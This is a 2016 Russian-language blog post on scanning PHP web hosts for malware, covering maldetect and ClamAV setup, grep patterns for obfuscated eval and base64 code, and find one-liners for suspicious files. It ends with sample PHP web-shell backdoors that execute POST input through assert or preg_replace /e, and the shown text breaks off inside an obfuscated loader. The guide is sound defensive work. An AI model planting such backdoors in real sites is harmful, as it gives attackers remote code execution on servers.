---
title: "PHP: antivirus website check"
date: 2016-07-21T03:02:01+00:00
url: /2016/07/php-antivirus-website-check/
categories:
  - Linux
  - virtualmin

---
**Автоматизированное сканирование:**

Базовая установка:

```shell
yum install clamav -y  
cd /root/install  
rm -rf maldetect-*  
wget http://www.rfxn.com/downloads/maldetect-current.tar.gz  
tar xfz maldetect-current.tar.gz  
cd maldetect-*  
./install.sh  
cd ~ && rm -rf /root/install/maldetect-* && rm -rf /etc/cron.daily/maldet  
echo ".avi  
.jpg  
.flv  
.png " > /usr/local/maldetect/ignore\_file\_ext  
```
Сканирование:  
```shell 
freshclam ; maldet -u ; maldet -d ;  
maldet --scan-all /home/  
```

**Ручная проверка** на предмет подозрительных файлов:  
Подозриельность определяеся наличием следующих комбинаций, которые находятся в одной строке файла:  
```shell  
eval.*str_rot13  
eval.*base64_decode  
eval.*gzinflate  
file\_put\_contents.*base64_decode  
base64_encode.*eval  
eval.\*(.\*GLOBAL.*(  
isset.\*(.\*eval.*(  
```  
Однострочники такие:  
```shell 
#  
find /var/www/\*/data/www/\*/wp-content/uploads/ /home/\*/domains/\*/\*/wp-content/uploads/ /home/\*/\*/wp-content/uploads/ -iname "\*.php"  
find /home/ -type f -iname "\*.php" -exec egrep -l 'eval.\*str\_rot13|eval.\*base64\_decode|eval.\*gzinflate|file\_put\_contents.\*base64\_decode|base64\_encode.\*eval|eval.\*\(.\*GLOBAL.\*\(|isset.\*\(.\*eval.\*\(|\w{525,}' {} \;  
#  
```

На что еще можно обратить внимание:  
```shell  
@system("killall  
file\_put\_contents('1.txt  
assert(  
FuncQueueObject  
\x62\x61\x73\x65\x36\x34\x5f\x64\x65\x63\x6f\x64\x65 # == base64_decode  
\x67\x7a\x69\x6e\x66\x6c\x61\x74\x65 # == gzinflate  
```

Интересные примеры:  
```shell  
<?php $k="ass"."ert"; $k(${"_PO"."ST"} ['pass']);?>

  
<?php ($b4dboy = $_POST['gnm']) &#038;&#038; @preg_replace('/ad/e','@'.str_rot13('riny').'($b4dboy)', 'add'); ?>

  
<?php function OLsy($yzcW){
$code='bas'.'e64_d'.'eco'.'de';
$yzcW=gzinflate($code($yzcW));
 for($i=0;$i<strlen($yzcW);$i++)
 {
$yzcW[$i] = chr(ord($yzcW[$i])-1);
 }
 return $yzcW;
 }eval(OLsy("
...
